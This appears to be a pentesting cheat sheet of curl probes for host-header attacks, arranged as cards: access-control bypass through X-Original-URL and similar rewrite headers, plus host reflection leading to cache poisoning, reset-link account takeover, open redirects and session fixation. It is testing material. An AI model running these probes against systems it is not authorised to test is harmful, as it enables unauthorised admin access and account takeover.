# Verified chains — the host-header chain card

The verified map — a shape, a chain, a proof.

---

## The host-header card — a rewrite ACL bypass

```text
a rewrite ACL bypass — a middleware rewrite → a rewritten path reaches a gated
route → an ACL bypass — a rewrite sink.
```

```bash
curl -i "$BASE/admin"                        # expect 403
curl -i -H 'X-Original-URL: /admin' "$BASE/" # 200 with the admin body = finding
curl -i -H 'X-Rewrite-URL: /admin' "$BASE/" # 200 with the admin body = finding
curl -i -H 'X-Forwarded-Path: /admin' "$BASE/" # 200 with the admin body = finding
curl -i -H 'X-Forwarded-Prefix: /admin' "$BASE/" # 200 with the admin body = finding
curl -i -H 'X-Original-Path: /admin' "$BASE/" # 200 with the admin body = finding
curl -i -H 'X-Real-Path: /admin' "$BASE/" # 200 with the admin body = finding
curl -i -H 'X-Original-URL: /internal' "$BASE/" # 200 with the internal body = finding
curl -i -H 'X-Original-URL: /private' "$BASE/" # 200 with the private body = finding
curl -i -H 'X-Original-URL: /api/admin' "$BASE/" # 200 with the api admin body = finding
curl -i -H 'X-Original-URL: /api/internal' "$BASE/" # 200 with the api internal body = finding
curl -i -H 'X-Original-URL: /api/private' "$BASE/" # 200 with the api private body = finding
curl -i -H 'X-Original-URL: /api/user' "$BASE/" # 200 with the api user body = finding
curl -i -H 'X-Original-URL: /api/debug' "$BASE/" # 200 with the api debug body = finding
curl -i -H 'X-Original-URL: /api/preview' "$BASE/" # 200 with the api preview body = finding
curl -i -H 'X-Rewrite-URL: /internal' "$BASE/" # 200 with the internal body = finding
curl -i -H 'X-Rewrite-URL: /private' "$BASE/" # 200 with the private body = finding
curl -i -H 'X-Rewrite-URL: /api/admin' "$BASE/" # 200 with the api admin body = finding
curl -i -H 'X-Rewrite-URL: /api/internal' "$BASE/" # 200 with the api internal body = finding
curl -i -H 'X-Rewrite-URL: /api/private' "$BASE/" # 200 with the api private body = finding
curl -i -H 'X-Rewrite-URL: /api/user' "$BASE/" # 200 with the api user body = finding
curl -i -H 'X-Rewrite-URL: /api/debug' "$BASE/" # 200 with the api debug body = finding
curl -i -H 'X-Rewrite-URL: /api/preview' "$BASE/" # 200 with the api preview body = finding
curl -i -H 'X-Original-Path: /internal' "$BASE/" # 200 with the internal body = finding
curl -i -H 'X-Original-Path: /private' "$BASE/" # 200 with the private body = finding
curl -i -H 'X-Original-Path: /api/admin' "$BASE/" # 200 with the api admin body = finding
curl -i -H 'X-Original-Path: /api/internal' "$BASE/" # 200 with the api internal body = finding
curl -i -H 'X-Original-Path: /api/private' "$BASE/" # 200 with the api private body = finding
curl -i -H 'X-Real-Path: /internal' "$BASE/" # 200 with the internal body = finding
curl -i -H 'X-Real-Path: /private' "$BASE/" # 200 with the private body = finding
curl -i -H 'X-Real-Path: /api/admin' "$BASE/" # 200 with the api admin body = finding
curl -i -H 'X-Real-Path: /api/internal' "$BASE/" # 200 with the api internal body = finding
curl -i -H 'X-Real-Path: /api/private' "$BASE/" # 200 with the api private body = finding
```

## The canonical-URL card — a stored injection

```text
a canonical-URL card — a reflected host → the app's links/scripts point to
attacker.com → a stored injection — a canonical-URL sink.
```

```bash
curl -s -D - -H 'Host: canary.example' "$BASE/robots.txt" | grep -i 'location\|set-cookie'
curl -s -H 'Host: canary.example' "$BASE/page" | grep -o 'canary[^"< ]*'
curl -s -D - -H 'Host: canary.example' "$BASE/sitemap.xml" | grep -i 'location\|set-cookie'
curl -s -D - -H 'Host: canary.example' "$BASE/callback" | grep -i 'location'
curl -s -D - -H 'Host: canary.example' "$BASE/verify" | grep -i 'location'
curl -s -D - -H 'Host: canary.example' "$BASE/confirm" | grep -i 'location'
curl -s -D - -H 'Host: canary.example' "$BASE/reset" | grep -i 'location\|set-cookie'
curl -s -D - -H 'Host: canary.example' "$BASE/login" | grep -i 'set-cookie'
curl -s -D - -H 'Host: canary.example' "$BASE/redirect" | grep -i 'location'
curl -s -D - -H 'Host: canary.example' "$BASE/page" | grep -i 'x-cache\|x-served\|age'
curl -s -D - -H 'Host: canary.example' "$BASE/api/internal" | grep -i 'location\|set-cookie'
curl -s -D - -H 'Host: canary.example' "$BASE/api/admin" | grep -i 'location\|set-cookie'
curl -s -D - -H 'Host: canary.example' "$BASE/api/user" | grep -i 'location\|set-cookie'
curl -s -D - -H 'Host: canary.example' "$BASE/api/debug" | grep -i 'location\|set-cookie'
curl -s -D - -H 'Host: canary.example' "$BASE/api/preview" | grep -i 'location\|set-cookie'
curl -s -D - -H 'Host: canary.example' "$BASE/api/private" | grep -i 'location\|set-cookie'
curl -s -D - -H 'Host: canary.example' "$BASE/api/internal" | grep -i 'location\|set-cookie'
```

## The reset-link card — an account takeover

```text
a reset-link card — a reflected forwarded header → the reset link points to
attacker.com → the victim's reset token stolen → an account takeover — a
reset-link sink.
```

```bash
curl -s -D - -H 'X-Forwarded-Host: canary.example' "$BASE/reset" | grep -i 'location\|set-cookie'
curl -s -D - -H 'X-Host: canary.example' "$BASE/reset" | grep -i 'location\|set-cookie'
curl -s -D - -H 'X-Forwarded-Server: canary.example' "$BASE/reset" | grep -i 'location\|set-cookie'
curl -s -D - -H 'X-HTTP-Host-Override: canary.example' "$BASE/reset" | grep -i 'location\|set-cookie'
curl -s -D - -H 'Forwarded: host=canary.example' "$BASE/reset" | grep -i 'location\|set-cookie'
curl -s -D - -H 'X-Forwarded-Email: admin@target.com' "$BASE/reset" | grep -i 'location\|set-cookie'
curl -s -D - -H 'X-Forwarded-User: admin' "$BASE/reset" | grep -i 'location\|set-cookie'
```

## The Location card — an open redirect

```text
a Location card — a reflected host → the Location points to attacker.com →
an open redirect — a Location sink.
```

```bash
curl -s -D - -H 'Host: canary.example' "$BASE/redirect" | grep -i 'location'
curl -s -D - -H 'X-Forwarded-Host: canary.example' "$BASE/redirect" | grep -i 'location'
curl -s -D - -H 'X-Host: canary.example' "$BASE/redirect" | grep -i 'location'
curl -s -D - -H 'Forwarded: host=canary.example' "$BASE/redirect" | grep -i 'location'
curl -s -D - -H 'Host: canary.example' "$BASE/callback" | grep -i 'location'
curl -s -D - -H 'Host: canary.example' "$BASE/verify" | grep -i 'location'
curl -s -D - -H 'Host: canary.example' "$BASE/confirm" | grep -i 'location'
curl -s -D - -H 'Host: canary.example' "$BASE/api/internal" | grep -i 'location'
curl -s -D - -H 'Host: canary.example' "$BASE/api/admin" | grep -i 'location'
curl -s -D - -H 'Host: canary.example' "$BASE/api/user" | grep -i 'location'
curl -s -D - -H 'Host: canary.example' "$BASE/api/debug" | grep -i 'location'
curl -s -D - -H 'Host: canary.example' "$BASE/api/preview" | grep -i 'location'
curl -s -D - -H 'Host: canary.example' "$BASE/api/private" | grep -i 'location'
```

## The Set-Cookie card — a session fixation

```text
a Set-Cookie card — a reflected host → the cookie domain binds to attacker.com
→ a session fixation — a Set-Cookie sink.
```

```bash
curl -s -D - -H 'Host: canary.example' "$BASE/login" | grep -i 'set-cookie'
curl -s -D - -H 'X-Forwarded-Host: canary.example' "$BASE/login" | grep -i 'set-cookie'
curl -s -D - -H 'X-Host: canary.example' "$BASE/login" | grep -i 'set-cookie'
curl -s -D - -H 'Forwarded: host=canary.example' "$BASE/login" | grep -i 'set-cookie'
curl -s -D - -H 'X-Forwarded-Proto: http' "$BASE/login" | grep -i 'set-cookie'
curl -s -D - -H 'X-Forwarded-Proto: https' "$BASE/login" | grep -i 'set-cookie'
```

## The cache-key card — a cache-poisoning feed

```text
a cache-key card — a reflected host → the cache stores the page under
attacker.com → a cache-poisoning feed — a cache-key sink.
```

```bash
curl -s -D - -H 'Host: canary.example' "$BASE/page" | grep -i 'x-cache\|x-served\|age'
curl -s -D - -H 'X-Forwarded-Host: canary.example' "$BASE/page" | grep -i 'x-cache\|x-served\|age'
curl -s -D - -H 'X-Host: canary.example' "$BASE/page" | grep -i 'x-cache\|x-served\|age'
curl -s -D - -H 'Forwarded: host=canary.example' "$BASE/page" | grep -i 'x-cache\|x-served\|age'
curl -s -D - -H 'X-Forwarded-Proto: http' "$BASE/page" | grep -i 'x-cache\|x-served\|age'
curl -s -D - -H 'X-Forwarded-Proto: https' "$BASE/page" | grep -i 'x-cache\|x-served\|age'
curl -s -D - -H 'X-Forwarded-Scheme: http' "$BASE/page" | grep -i 'x-cache\|x-served\|age'
curl -s -D - -H 'X-Forwarded-Scheme: https' "$BASE/page" | grep -i 'x-cache\|x-served\|age'
```

## The forwarded card — a stored injection

```text
a forwarded card — a reflected forwarded header → the app's links point to
attacker.com → a stored injection — a forwarded sink.
```

```bash
curl -s -H 'Forwarded: host=canary.example' "$BASE/page" | grep -o 'canary[^"< ]*'
curl -s -H 'Forwarded: for=127.0.0.1;host=canary.example;proto=http' "$BASE/page" | grep -o 'canary[^"< ]*'
curl -s -H 'Forwarded: host=canary.example;for=127.0.0.1' "$BASE/page" | grep -o 'canary[^"< ]*'
curl -s -H 'Forwarded: host=canary.example;proto=http' "$BASE/page" | grep -o 'canary[^"< ]*'
curl -s -H 'Forwarded: for=127.0.0.1;host=canary.example' "$BASE/page" | grep -o 'canary[^"< ]*'
curl -s -H 'Forwarded: for=127.0.0.1;host=canary.example;proto=https' "$BASE/page" | grep -o 'canary[^"< ]*'
curl -s -H 'Forwarded: for=::1;host=canary.example' "$BASE/page" | grep -o 'canary[^"< ]*'
curl -s -H 'Forwarded: for=10.0.0.1;host=canary.example' "$BASE/page" | grep -o 'canary[^"< ]*'
curl -s -H 'Forwarded: host=canary.example' "$BASE/robots.txt" | grep -i 'location\|set-cookie'
curl -s -H 'Forwarded: host=canary.example' "$BASE/sitemap.xml" | grep -i 'location\|set-cookie'
curl -s -H 'Forwarded: for=127.0.0.1;host=canary.example;proto=http' "$BASE/robots.txt" | grep -i 'location\|set-cookie'
curl -s -H 'Forwarded: for=127.0.0.1;host=canary.example;proto=http' "$BASE/sitemap.xml" | grep -i 'location\|set-cookie'
```
